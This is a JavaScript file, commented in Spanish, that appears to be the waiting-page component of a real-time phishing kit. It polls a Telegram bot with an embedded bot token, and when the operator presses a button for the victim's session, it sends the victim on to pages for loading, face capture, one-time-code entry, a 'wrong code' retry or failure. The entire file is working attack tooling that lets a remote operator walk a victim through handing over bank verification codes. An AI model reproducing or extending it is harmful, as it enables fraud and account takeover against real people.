// ═══════════════════════════════════════════════
//  actions.js — Redireccionador en wait.html
// ═══════════════════════════════════════════════

const ACTIONS = {
  cargando:       "cargando.html",
  cara:           "cara.html",
  otp:            "otp.html",
  otp_incorrecto: "otp_incorrecto.html",
  ko:             "ko.html"
};

function getSessionId() {
  return new URLSearchParams(window.location.search).get("s");
}

// ── Guarda y recupera el offset en localStorage ──
function getOffset()        { return parseInt(localStorage.getItem("bdp_offset") || "0"); }
function saveOffset(offset) { localStorage.setItem("bdp_offset", offset); }

// ── Obtiene el update_id más alto actual para usarlo como offset inicial ──
// Así ignoramos todos los callbacks que ya existían ANTES de llegar a wait.html
async function initOffset() {
  try {
    const res  = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?limit=100`);
    const data = await res.json();
    if (data.ok && data.result.length > 0) {
      const maxId = Math.max(...data.result.map(u => u.update_id));
      // offset = maxId + 1 → Telegram descartará todo lo anterior
      saveOffset(maxId + 1);
    }
  } catch(_) {}
}

async function pollAction() {
  const sessionId = getSessionId();
  if (!sessionId) return;

  const offset = getOffset();
  const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?timeout=20&offset=${offset}&allowed_updates=["callback_query"]`;

  try {
    const res  = await fetch(url);
    const data = await res.json();

    if (!data.ok) {
      setTimeout(pollAction, 3000);
      return;
    }

    for (const update of data.result) {
      // Siempre avanzamos el offset para no releer este update
      saveOffset(update.update_id + 1);

      const cb = update.callback_query;
      if (!cb) continue;

      const [action, sid] = (cb.data || "").split("|");

      // Ignorar si no corresponde a esta sesión
      if (sid !== sessionId) continue;

      const destino = ACTIONS[action];
      if (!destino) continue;

      // Guarda acción en localStorage
      localStorage.setItem("bdp_accion", action);
      try {
        const s = JSON.parse(localStorage.getItem("bdp_session") || "{}");
        s.accion = action;
        localStorage.setItem("bdp_session", JSON.stringify(s));
      } catch(_) {}

      // Confirma el callback al bot (quita el reloj de arena en Telegram)
      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ callback_query_id: cb.id, text: `✅ Redirigiendo...` })
      }).catch(() => {});

      // Redirige
      window.location.href = destino;
      return;
    }

  } catch(_) {}

  // Ninguna acción todavía → reintenta
  setTimeout(pollAction, 2500);
}

document.addEventListener("DOMContentLoaded", async () => {
  // Primero establece el offset inicial para ignorar callbacks viejos
  await initOffset();
  // Luego empieza a escuchar sólo los nuevos
  pollAction();
});